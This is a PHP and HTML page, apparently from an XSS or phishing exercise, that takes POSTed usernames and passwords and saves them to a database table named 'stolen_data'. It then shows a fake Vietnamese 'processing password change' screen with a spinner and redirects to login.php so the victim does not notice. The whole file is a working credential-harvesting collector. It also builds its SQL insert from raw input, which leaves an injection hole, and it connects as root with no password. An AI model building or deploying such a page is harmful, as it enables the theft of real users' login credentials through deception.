<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "xss";

$mysqli = new mysqli($servername, $username, $password, $dbname);
if ($mysqli->connect_error) {
    die("Kết nối thất bại: " . $mysqli->connect_error);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    //luu thong tin danh cap
    $mysqli->query("
        INSERT INTO stolen_data (username, password, created_at)
        VALUES ('$username', '$password', NOW())
    ");
}
?>
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Đang xử lý...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 100px;
      align-items: center;
      align-self: center;
    }
    .box {
      display: inline-block;
      padding: 30px;
    }
    .spinner {
      margin: 20px auto;
      width: 50px;
      height: 50px;
      border: 6px solid #f3f3f3;
      border-top: 6px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="box">
    <h3>Đang xử lý yêu cầu đổi mật khẩu...</h3>
    <div class="spinner"></div>
    <p>Vui lòng chờ trong giây lát.</p>
  </div>

  <script>
  // hieu ung chuyen trang
  setTimeout(function() {
    document.body.style.transition = "opacity 0.5s";
    document.body.style.opacity = 0;

    setTimeout(function() {
      window.location.href = "login.php";
    }, 500); // sau 0.5 giây (hieu ung mo dan) thi chuyen
  }, 3000); // cho 3 giay truoc khi fade
</script>
</body>
</html>
